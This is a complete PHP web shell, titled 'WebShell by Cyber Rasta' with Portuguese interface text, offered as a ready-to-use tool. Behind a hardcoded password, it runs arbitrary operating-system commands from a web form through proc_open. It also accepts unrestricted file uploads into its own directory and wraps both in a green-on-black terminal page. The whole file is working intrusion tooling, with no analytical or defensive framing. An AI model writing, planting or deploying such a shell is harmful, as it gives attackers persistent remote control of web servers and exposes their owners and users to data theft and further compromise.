<?php
$password = '12345678';

session_start();
if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['password']) && $_POST['password'] === $password) {
        $_SESSION['authenticated'] = true;
    } else {
        echo '<form method="POST"><input type="password" name="password"/><input type="submit" value="Login"/></form>';
        exit;
    }
}

function executeCommand($command) {
    $descriptorspec = array(
       0 => array("pipe", "r"), 
       1 => array("pipe", "w"),
       2 => array("pipe", "w")
    );

    $process = proc_open($command, $descriptorspec, $pipes, realpath('./'), array());

    if (is_resource($process)) {
        $output = '';
        while ($s = fgets($pipes[1])) {
            $output .= htmlspecialchars($s);
        }

        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        proc_close($process);

        return $output;
    }
    return '';
}

if (isset($_POST['command'])) {
    echo "<pre><span style='color: cyan;'>" . htmlspecialchars($_POST['command']) . "</span>\n" . executeCommand($_POST['command']) . "</pre>";
    exit;
}

if (isset($_FILES['file'])) {
    $uploadDirectory = __DIR__ . "/";
    if (!is_dir($uploadDirectory)) {
        mkdir($uploadDirectory, 0777, true);
    }
    $uploadFile = $uploadDirectory . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        echo "<pre>Upload realizado com sucesso em " . htmlspecialchars($uploadFile) . "</pre>";
    } else {
        echo "<pre>Falha ao realizar o upload</pre>";
    }
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'clear') {
    echo "<script>document.getElementById('output').innerHTML = '';</script>";
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>WebShell by Cyber Rasta</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; }
        form { margin: 0; }
        input[type=text], input[type=file] { background-color: #000; color: #0f0; border: none; width: 90%; font-size: 1.2em; padding: 10px; margin: 10px 0; }
        input[type=submit] { background-color: #000; color: #0f0; border: none; font-size: 1.2em; padding: 10px; margin: 10px 0; cursor: pointer; }
        #output { margin: 10px 0; padding: 10px; background-color: #111; overflow-y: auto; max-height: 500px; }
    </style>
</head>
<body>
    <h1>WebShell by Cyber Rasta</h1>
    <div id="output"></div>
    <form method="POST" id="commandForm">
        <input type="text" name="command" id="commandInput" placeholder="Enter command" autofocus autocomplete="off"/>
        <input type="submit" value="Executar"/>
    </form>
    <form method="POST" id="clearForm">
        <input type="hidden" name="action" value="clear"/>
        <input type="submit" value="Limpar"/>
    </form>
    <form method="POST" id="uploadForm" enctype="multipart/form-data">
        <input type="file" name="file" id="fileInput"/>
        <input type="submit" value="Upload"/>
    </form>

    <script>
        document.getElementById('commandForm').onsubmit = function() {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    var output = document.getElementById('output');
                    var command = document.getElementById('commandInput').value;
                    output.innerHTML += xhr.responseText;
                    output.scrollTop = output.scrollHeight;
                    document.getElementById('commandInput').value = '';
                }
            };
            var command = document.getElementById('commandInput').value;
            xhr.send('command=' + encodeURIComponent(command));
            return false;
        };

        document.getElementById('clearForm').onsubmit = function() {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    var output = document.getElementById('output');
                    output.innerHTML = '';
                }
            };
            xhr.send('action=clear');
            return false;
        };

        document.getElementById('uploadForm').onsubmit = function() {
            var formData = new FormData(document.getElementById('uploadForm'));
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    var output = document.getElementById('output');
                    output.innerHTML += xhr.responseText;
                    output.scrollTop = output.scrollHeight;
                    document.getElementById('fileInput').value = '';
                }
            };
            xhr.send(formData);
            return false;
        };
    </script>
</body>
</html>
